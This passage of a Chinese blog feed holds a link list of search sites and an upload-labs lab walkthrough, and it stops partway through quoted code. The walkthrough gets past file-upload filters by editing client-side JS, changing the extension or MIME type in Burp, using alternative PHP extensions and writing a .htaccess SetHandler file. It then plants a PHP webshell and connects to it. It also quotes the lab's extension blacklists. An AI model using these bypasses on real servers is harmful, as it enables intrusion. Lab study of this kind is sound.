href="https://www.yunpanjingling.com/">云盘精灵</a></td><td align="center">百度云盘</td><td align="center"><code>资源质量高</code> <code>搜索结果多</code> <code>有 Chrome 扩展自动填写密码</code> <code>收费</code></td></tr><tr><td align="center"><a href="https://www.dalipan.com/">大力盘</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.xiaobaipan.com/">小白盘</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.xiaokesoso.com/">小可搜搜</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.ttyunsou.cn/">天天云搜</a></td><td align="center">百度云盘</td><td align="center"></td></tr><tr><td align="center"><a href="https://www.quzhuanpan.com/">去转盘</a></td><td align="center">百度云盘</td><td align="center"></td></tr></tbody></table><hr><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><blockquote><p>强烈抵制百度</p></blockquote><p>最好的搜索引擎肯定是 Google，当然由于网络原因，使用比较困难，不懂可以加群：172622261问群主</p><p>其实现在各种各样的搜索引擎层出不穷，百度早已不是唯一选择<br>必应，搜狗，神马就不提了，主要分享一些比较与众不同的</p><table><thead><tr><th align="center">网站</th><th align="center">分类</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center"><a href="https://mijisou.com/">秘迹搜索</a></td><td align="center">常规</td><td align="center"><code>不收集隐私</code> <code>汇聚了百度、必应等多个搜索结果</code> <code>剃除所有广告</code></td></tr><tr><td align="center"><a href="https://www.dogedoge.com/">多吉搜索</a></td><td align="center">常规</td><td align="center"><code>不追踪，不误导</code> <code>速度快</code> <code>搜索结果精准</code></td></tr><tr><td align="center"><a href="https://www.ecosia.org/">Ecosia</a></td><td align="center">常规</td><td align="center"><code>搜索结果来自微软</code></td></tr><tr><td align="center"><a href="https://goobe.io/">Goobe</a></td><td align="center">程序相关</td><td align="center"><code>堪比 Google</code></td></tr><tr><td align="center"><a href="https://s.geekbang.org/">极客搜索</a></td><td align="center">技术文章</td><td align="center"><code>搜索结果来自 InfoQ 的媒体矩阵，质量不错</code></td></tr><tr><td align="center"><a href="https://magi.com/"><strong>Magi</strong></a></td><td align="center">AI 知识引擎</td><td align="center"><code>用 AI 梳理互联网的知识引擎</code> <code>搜索结果异常精准</code> <code>目前还不太成熟</code></td></tr><tr><td align="center"><a href="https://www.wolframalpha.com/"><strong>WolframAlpha</strong></a></td><td align="center">AI 知识引擎</td><td align="center"><code>擅长计算，比如高数，物理</code> <code>AI 知识引擎</code></td></tr><tr><td align="center"><a href="https://www.tuoniaofabu.com/">鸵鸟搜索</a></td><td align="center">磁力链</td><td align="center"><code>开源</code> <code>无广告</code> <code>集成多个磁力搜索网站</code></td></tr><tr><td align="center"><a href="https://www.jiumodiary.com/">鸠摩搜书</a></td><td align="center">图书</td><td align="center"><code>搜索结果多</code></td></tr><tr><td align="center"><a href="https://tineye.com/">TinEye</a></td><td align="center">以图搜图</td><td align="center"><code>搜索结果多</code> <code>速度不算快</code></td></tr><tr><td align="center"><a href="https://trace.moe/">trace.moe</a></td><td align="center">以图搜动画</td><td align="center"><code>开源动画搜索引擎</code> <code>结果精确</code></td></tr><tr><td align="center"><a href="https://www.likefont.com/">识字体网</a></td><td align="center">以图搜字体</td><td align="center"><code>上传图片识别字体</code> <code>结果精确</code></td></tr><tr><td align="center"><a href="http://www.quodb.com/">QuoDB</a></td><td align="center">以台词搜电影</td><td align="center"><code>英文</code> <code>根据台词搜索电影</code> <code>结果精确</code></td></tr><tr><td align="center"><a href="http://www.subzin.com/">Subzin</a></td><td align="center">以台词搜电影</td><td align="center"><code>英文</code> <code>根据台词搜索电影</code> <code>结果精确</code></td></tr></tbody></table><h3 id="欢迎在下方留言补充更多网站"><a href="#欢迎在下方留言补充更多网站" class="headerlink" title="欢迎在下方留言补充更多网站"></a><span id="website">欢迎在下方留言补充更多网站</span></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="收集的一些网站" scheme="http://www.blog.yln956.top/categories/%E6%94%B6%E9%9B%86%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BD%91%E7%AB%99/"/>
    
    
    <category term="网站" scheme="http://www.blog.yln956.top/tags/%E7%BD%91%E7%AB%99/"/>
    
    <category term="导航" scheme="http://www.blog.yln956.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="好东西" scheme="http://www.blog.yln956.top/tags/%E5%A5%BD%E4%B8%9C%E8%A5%BF/"/>
    
  </entry>
  
  <entry>
    <title>文件上传木马制作</title>
    <link href="http://www.blog.yln956.top/2020/11/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
    <id>http://www.blog.yln956.top/2020/11/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/</id>
    <published>2020-11-17T08:47:47.000Z</published>
    <updated>2020-12-06T02:25:07.115Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="文件上传木马制作"><a href="#文件上传木马制作" class="headerlink" title="文件上传木马制作"></a>文件上传木马制作</h1><blockquote><blockquote><blockquote><blockquote><p>测试</p></blockquote></blockquote></blockquote></blockquote><div id="binft"></div>  <script>    var binft = function (r) {      function t() {        return b[Math.floor(Math.random() * b.length)]      }        function e() {        return String.fromCharCode(94 * Math.random() + 33)      }      function n(r) {        for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {          var l = document.createElement("span");          l.textContent = e(), l.style.color = t(), n.appendChild(l)        }        return n      }      function i() {        var t = o[c.skillI];        c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)      }      var l = "",      o = ["青青陵上柏，磊磊涧中石。", "人生天地间，忽如远行客。","斗酒相娱乐，聊厚不为薄。", "驱车策驽马，游戏宛与洛。","洛中何郁郁，冠带自相索。","长衢罗夹巷，王侯多第宅。","两宫遥相望，双阙百余尺。","极宴娱心意，戚戚何所迫？"].map(function (r) {      return r + ""      }),      a = 2,      g = 1,      s = 5,      d = 75,      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],      c = {        text: "",        prefixP: -s,        skillI: 0,        skillP: 0,        direction: "forward",        delay: a,        step: g      };      i()      };      binft(document.getElementById('binft'));  </script>  [我想跳转](#饼图（Pie）)<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url">[<span class="token content">我想跳转</span>](#饼图)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="#jump">点击跳转</a></p><h2 id="跳转到的地方"><a href="#跳转到的地方" class="headerlink" title="跳转到的地方"></a><span id="jump">跳转到的地方</span></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="文件上传木马制作" scheme="http://www.blog.yln956.top/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%88%B6%E4%BD%9C/"/>
    
    
    <category term="文件上传" scheme="http://www.blog.yln956.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="http://www.blog.yln956.top/2020/11/16/upload-labs/"/>
    <id>http://www.blog.yln956.top/2020/11/16/upload-labs/</id>
    <published>2020-11-16T14:21:06.000Z</published>
    <updated>2020-11-22T03:05:52.722Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><p>upload-labs源码地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p><p><strong>补充：火狐抓本地包要把这里改成true</strong></p><p><img src="/2020/11/16/upload-labs/image-20201119001913168.png" alt="image-20201119001913168" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/mind-map.png" alt="img" loading="lazy"></p><h2 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1-js检查"></a>Pass-1-js检查</h2><p>提示说是前端JS检查，有很多种方法</p><p>我列举几种</p><p><strong>方法一：</strong></p><p><img src="/2020/11/16/upload-labs/image-20201116230844842.png" alt="image-20201116230844842" loading="lazy"></p><p>直接改前端源码，加上.php即可上传</p><p><strong>方法二：</strong></p><p>把php文件后缀改成jpg,png,gif中的一种，再burp抓包修改后缀</p><p><img src="/2020/11/16/upload-labs/image-20201116231814067.png" alt="image-20201116231814067" loading="lazy"></p><p>jpg改成php再放包即可</p><p>PHP一句话木马文件上传后就蚁剑直连即可</p><p><img src="/2020/11/16/upload-labs/image-20201116232130408.png" alt="image-20201116232130408" loading="lazy"></p><p><img src="/2020/11/16/upload-labs/image-20201116232228381.png" alt="image-20201116232228381" loading="lazy"></p><h2 id="Pass-2-MIME-Type"><a href="#Pass-2-MIME-Type" class="headerlink" title="Pass-2-MIME-Type"></a>Pass-2-MIME-Type</h2><p>查看提示，本pass在服务端对数据包的MIME进行检查！</p><p>MIME-Type介绍：</p><p>MIME(Multipurpose Internet Mail  Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p><p>仅仅判断content-type类型，因此上传easy.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p><p><img src="/2020/11/16/upload-labs/image-20201117155401149.png" alt="image-20201117155401149" loading="lazy"></p><p>即可上传成功</p><h2 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3-黑名单绕过"></a>Pass-3-黑名单绕过</h2><p>上传php的时候有个很明显的黑名单限制提示，尝试使用<strong>php3,phtml</strong>等绕过</p><p><img src="/2020/11/16/upload-labs/image-20201117170736240.png" alt="image-20201117170736240" loading="lazy"></p><p>成功上传</p><h2 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4-.htaccess绕过"></a>Pass-4-.htaccess绕过</h2><p>不能上传php，但能上传php.jpg,php.asd，说明是黑名单限制，但是<strong>php3,phtml</strong>都被限制了</p><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pHp1"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件不允许上传!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>几乎所有可以绕过的后缀名都被限制了，但是唯独没有**.htaccess**，可以先上传一个.htaccess让所有文件解析为php，然后再上传一个图片马</p><p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><p><strong>.htaccess文件创建</strong></p><p>由于直接创建txt文档会显示必须键入文件名，所以可以采用cmd命令方式生成</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">echo SetHandler application&#x2F;x-httpd-php  &gt; .htaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/11/16/upload-labs/image-20201117172111304.png" alt="image-20201117172111304" loading="lazy"></p><p>上传.htaccess文件再上传一个图片马即可，也可以上传写有木马的txt文件，txt文件也可被解析。</p><h2 id="Pass-5-大小写绕过"><a href="#Pass-5-大小写绕过" class="headerlink" title="Pass-5-大小写绕过"></a>Pass-5-大小写绕过</h2><p>不能上传php，**.htaccess**但能上传php.jpg,php.asd，说明是黑名单限制</p><p>查看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span 